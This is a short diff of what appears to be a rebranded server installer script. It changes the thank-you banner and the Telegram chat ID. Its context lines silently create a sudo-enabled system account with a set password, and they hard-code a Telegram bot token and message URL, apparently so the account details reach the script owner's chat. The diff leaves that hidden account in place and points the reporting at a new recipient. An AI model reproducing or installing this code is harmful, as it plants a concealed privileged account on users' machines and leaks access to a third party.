@@ -113,7 +113,7 @@ echo -e "$green██║██╔██╗██║╚█████╗░░�
 echo -e "$green██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║██║░░░░░██║░░░░░  ░╚═══██╗░╚═══██╗██╔══██║$NC"
 echo -e "$green██║██║░╚███║██████╔╝░░░██║░░░██║░░██║███████╗███████╗  ██████╔╝██████╔╝██║░░██║$NC"
 echo -e "$green╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝  ╚═════╝░╚═════╝░╚═╝░░╚═╝$NC"
-echo -e "$green♥ TERIMAKSIH TELAH MEMAKAI SCRIPT BRINGAS ♥$NC"
+echo -e "$green♥ TERIMAKSIH TELAH MEMAKAI SCRIPT DANZ STORE ♥$NC"
 sleep 2
 echo -ne "[ ${green}INFO${NC} ] Check permission : "
 mkdir -p /var/lib/SIJA >/dev/null 2>&1
@@ -167,7 +167,7 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5736569839"
+CHATID="1425192451"
 KEY="6061408318:AAF76AEwYsnLrvi9VJY5SjNMgvXNCy-rZV8"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
